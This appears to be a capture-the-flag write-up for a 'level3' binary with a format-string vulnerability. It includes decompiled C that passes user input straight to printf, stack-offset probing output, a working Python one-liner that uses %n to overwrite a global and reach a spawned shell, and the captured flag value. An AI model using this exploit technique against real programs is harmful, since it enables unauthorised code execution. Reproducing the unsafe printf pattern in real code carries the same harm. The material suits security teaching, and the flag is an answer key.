```c
void v(void)
{
  char buffer [520];

  fgets(buffer,512,stdin);
  printf(buffer);
  if (m == 64) {
    fwrite("Wait what?!\n",1,12,stdout);
    system("/bin/sh");
  }
  return;
}

void main(void)
{
  v();
  return;
}
```

We can see here that `printf` is called, however the argument is not an absolute string, but instead a value that we can control. Therefore, we can use a little known feature of `printf`: the `%n`, that allows writing to the stack !

[Exploit 101 - Format Strings - BreakInSecurity](https://axcheron.github.io/exploit-101-format-strings/)

For that, we need to write `64` to the address of m. Meaning we have to get the address of m, write it to the buffer, determine where it is written in the memory, and finally write 64 - 4 characters with the `%n` to write this number to the memory, with `4$` used to specify what address to write to (spoiler: the address of m). 
Address of m: `0x0804988c` -> `\x8c\x98\x04\x08`

Let's try to determine at what position what we write in the memory is:

```bash
./level3 
AAAA %x %x %x %x %x %x %x %x %x %x 
AAAA 200 b7fd1ac0 b7ff37d0 `41414141` 20782520 25207825 78252078 20782520 25207825 78252078 
```

We get `AAAA` at the fourth argument (`41414141`).

Let's now verify we can write an address here:

```bash
python -c "print '\x8c\x98\x04\x08'+'%x %x %x %x'" | ./level3
�200 b7fd1ac0 b7ff37d0 `804988c`
```

Finally, let's write the exploit by specifying to write the 64 bytes to the address of m:

```bash
(python -c 'print "\x8c\x98\x04\x08" + ("A" * 60) + "%4$n"' ; cat) | ./level3
```

`b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa`
